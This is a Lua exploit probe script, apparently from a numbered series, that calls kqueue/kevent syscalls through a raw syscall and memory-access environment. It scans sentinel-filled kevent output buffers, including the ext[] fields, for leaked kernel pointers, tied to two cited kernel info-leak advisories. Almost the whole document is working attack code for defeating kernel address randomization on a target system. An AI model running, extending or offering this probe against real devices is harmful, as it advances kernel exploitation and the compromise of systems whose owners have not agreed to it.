-- CRASH_CLASS: LOW
-- PROBE 1409a: SA-26:48/SA-26:51 kevent + ktimer stack info leaks
--
-- Context: Two SA info leaks that may expose kernel pointers:
-- SA-26:48 (2026-06-30): compat32 kevent copies uninitialized stack.
--   Probably requires 32-bit compat mode, but worth testing in 64-bit.
-- SA-26:51 (2026-07-29): timer_settime CLOCK_TAI uninit stack.
--   Tested in 1407a; this probe focuses on kevent extended output.
--
-- This probe creates kqueue events and carefully examines the output
-- struct for any uninitialized padding bytes that might contain
-- kernel pointers. It also tests kevent with EVFILT_TIMER for TAI.
--
-- prior art: probes 20/21/30c (kqueue basic), 271i (EVFILT_TIMER works),
--            56q (kevent output scan — 0 events returned with zero timeout)

print("=== PROBE 1409a: kevent + ktimer padding leak scan ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local sc_kqueue = make_syscall(362)
local sc_kevent = make_syscall(363)
local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)

-- struct kevent on FreeBSD/amd64:
-- uintptr_t ident (8)    +0x00
-- short     filter (2)   +0x08
-- u_short   flags (2)    +0x0A
-- u_int     fflags (4)   +0x0C
-- intptr_t  data (8)     +0x10
-- void*     udata (8)    +0x18
-- u_int64_t ext[4] (32)  +0x20
-- Total = 64 bytes

local KEVENT_SIZE = 64
local EV_ADD = 0x0001
local EV_ENABLE = 0x0004
local EV_ONESHOT = 0x0010
local EVFILT_TIMER = -7
local EVFILT_READ = -1

print("== Section A: Create kqueue + arm timer ==")

local kq
pcall(function() kq = sc_kqueue() end)
print(string.format("kqueue(): %s", tostring(kq)))

if not kq then
    print("kqueue failed, aborting")
    print("=== PROBE 1409a COMPLETE (DEAD) ===")
    return
end

local h_kq, l_kq = get_hi_lo(kq)
if h_kq == 0xFFFFFFFF then
    print("kqueue returned -1, aborting")
    print("=== PROBE 1409a COMPLETE (DEAD) ===")
    return
end

-- Register a 1ms timer (EVFILT_TIMER, ident=42)
local changelist = memory.alloc(KEVENT_SIZE)
-- ident = 42
safe_wq(changelist + 0x00, uint64(42))
-- filter = EVFILT_TIMER = -7 = 0xFFF9
safe_wd(changelist + 0x08, 0x0001FFF9)  -- filter=-7, flags=EV_ADD
-- fflags = 0 (milliseconds)
safe_wd(changelist + 0x0C, 0)
-- data = 10 (10ms timer)
safe_wq(changelist + 0x10, uint64(10))
-- udata = 0
safe_wq(changelist + 0x18, uint64(0))

-- Submit the change
local ret_kev
pcall(function()
    ret_kev = sc_kevent(uint64(l_kq), uint64(changelist), uint64(1),
                         uint64(0), uint64(0), uint64(0))
end)
print(string.format("kevent(add timer): ret=%s", tostring(ret_kev)))

-- Wait 50ms for timer to fire
local sc_nanosleep = make_syscall(240)
local ts_wait = memory.alloc(16)
safe_wq(ts_wait, uint64(0))
safe_wq(ts_wait + 8, uint64(50000000))  -- 50ms
pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

print("")
print("== Section B: Read events with sentinel-filled buffer ==")

-- Fill output buffer with sentinel pattern
local eventlist = memory.alloc(KEVENT_SIZE * 4)
for i = 0, KEVENT_SIZE * 4 - 1, 8 do
    safe_wq(eventlist + i, uint64("0xAAAAAAAABBBBBBBB"))
end

-- No timeout (zero timespec = poll)
local timeout = memory.alloc(16)
safe_wq(timeout, uint64(0))
safe_wq(timeout + 8, uint64(0))

local ret_poll
pcall(function()
    ret_poll = sc_kevent(uint64(l_kq), uint64(0), uint64(0),
                          uint64(eventlist), uint64(4), uint64(timeout))
end)
print(string.format("kevent(poll): ret=%s", tostring(ret_poll)))

local h_poll, l_poll = 0, 0
if ret_poll then h_poll, l_poll = get_hi_lo(ret_poll) end

if h_poll ~= 0xFFFFFFFF and l_poll > 0 then
    print(string.format("  Got %d events!", l_poll))

    -- Dump EVERY byte of the returned event structs
    for ev = 0, math.min(l_poll, 4) - 1 do
        local base = eventlist + ev * KEVENT_SIZE
        print(string.format("  Event %d:", ev))

        local fields = {
            {0x00, "ident"},
            {0x08, "filter+flags"},
            {0x0C, "fflags"},
            {0x10, "data"},
            {0x18, "udata"},
            {0x20, "ext[0]"},
            {0x28, "ext[1]"},
            {0x30, "ext[2]"},
            {0x38, "ext[3]"},
        }

        local found_kptr = false
        for _, f in ipairs(fields) do
            local off, name = f[1], f[2]
            if off < 0x0C or off >= 0x10 then
                -- 8-byte fields
                local q = safe_rq(base + off)
                if q then
                    local h, l = get_hi_lo(q)
                    local tag = ""
                    if h == 0xAAAAAAAA and l == 0xBBBBBBBB then tag = " [SENTINEL]"
                    elseif h >= 0xFFFF8000 then
                        tag = " [*** KERNEL POINTER ***]"
                        found_kptr = true
                    elseif h > 0x100 and h < 0xFFFF0000 then tag = " [userland ptr?]"
                    end
                    print(string.format("    +0x%02X %-12s: %s%s", off, name, hex64(q), tag))
                end
            else
                -- 4-byte field
                local d = safe_rd(base + off)
                if d then
                    print(string.format("    +0x%02X %-12s: 0x%08X", off, name, d))
                end
            end
        end
        if found_kptr then
            print("    *** KERNEL POINTER FOUND IN KEVENT OUTPUT ***")
        end
    end
else
    print("  No events returned (timer may not have fired)")
    -- Still check if any bytes were modified
    local modified = 0
    for i = 0, KEVENT_SIZE - 1, 8 do
        local q = safe_rq(eventlist + i)
        if q then
            local h, l = get_hi_lo(q)
            if h ~= 0xAAAAAAAA or l ~= 0xBBBBBBBB then
                modified = modified + 1
                print(string.format("    +0x%02X: %s (modified!)", i, hex64(q)))
            end
        end
    end
    if modified == 0 then
        print("  Buffer completely untouched")
    end
end

print("")
print("== Section C: Large kevent batch (scan ext[] fields) ==")

-- The ext[4] fields (32 bytes at +0x20) are the most likely leak source
-- They're often not fully initialized on older kernels

-- Arm 8 different timers
for id = 1, 8 do
    local cl = memory.alloc(KEVENT_SIZE)
    safe_wq(cl + 0x00, uint64(100 + id))
    safe_wd(cl + 0x08, 0x0001FFF9)  -- EVFILT_TIMER + EV_ADD
    safe_wd(cl + 0x0C, 0)
    safe_wq(cl + 0x10, uint64(5))   -- 5ms
    pcall(function()
        sc_kevent(uint64(l_kq), uint64(cl), uint64(1), uint64(0), uint64(0), uint64(0))
    end)
end

-- Wait 50ms
pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

-- Read with large sentinel-filled buffer
local bigbuf = memory.alloc(KEVENT_SIZE * 16)
for i = 0, KEVENT_SIZE * 16 - 1, 8 do
    safe_wq(bigbuf + i, uint64("0xCCCCCCCCDDDDDDDD"))
end

local ret_big
pcall(function()
    ret_big = sc_kevent(uint64(l_kq), uint64(0), uint64(0),
                         uint64(bigbuf), uint64(16), uint64(timeout))
end)

local h_big, l_big = 0, 0
if ret_big then h_big, l_big = get_hi_lo(ret_big) end
print(string.format("kevent(batch): ret=%s (%d events)", tostring(ret_big), l_big))

local kptr_count = 0
for ev = 0, math.min(l_big, 16) - 1 do
    local base = bigbuf + ev * KEVENT_SIZE
    -- Focus on ext[] fields
    for ext = 0, 3 do
        local q = safe_rq(base + 0x20 + ext * 8)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 then
                print(string.format("  Event %d ext[%d]: %s [*** KERNEL PTR ***]",
                    ev, ext, hex64(q)))
                kptr_count = kptr_count + 1
            elseif h ~= 0xCCCCCCCC or l ~= 0xDDDDDDDD then
                if h ~= 0 or l ~= 0 then
                    print(string.format("  Event %d ext[%d]: %s [nonzero]",
                        ev, ext, hex64(q)))
                end
            end
        end
    end
end

if kptr_count > 0 then
    print(string.format("*** FOUND %d KERNEL POINTERS IN KEVENT EXT[] ***", kptr_count))
else
    print("  No kernel pointers in ext[] fields")
end

-- Clean up
pcall(function() sc_close(uint64(l_kq)) end)

print("")
print("=== PROBE 1409a COMPLETE ===")
